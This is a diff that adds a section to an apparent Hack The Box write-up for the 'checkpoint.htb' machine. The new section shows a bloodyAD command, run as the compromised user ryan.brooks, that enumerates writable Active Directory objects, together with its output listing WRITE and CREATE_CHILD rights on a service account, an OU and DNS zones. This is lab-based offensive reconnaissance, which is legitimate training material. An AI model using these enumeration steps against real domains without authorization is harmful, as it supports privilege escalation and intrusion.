@@ -361,6 +361,31 @@ SMB         dc01.checkpoint.htb 445    DC01             [+] CHECKPOINT.HTB\ryan.
 
 Then after exporting it i can auth as this user!
 
+# Writable objects as `ryan.brooks`
+
+```python
+❯❯❯ bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -k get writable                                                                                                                                    
+Clock skew detected. Adjusting local time by 6:59:59.720974. Retrying operation.
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+```
+
 
 
 
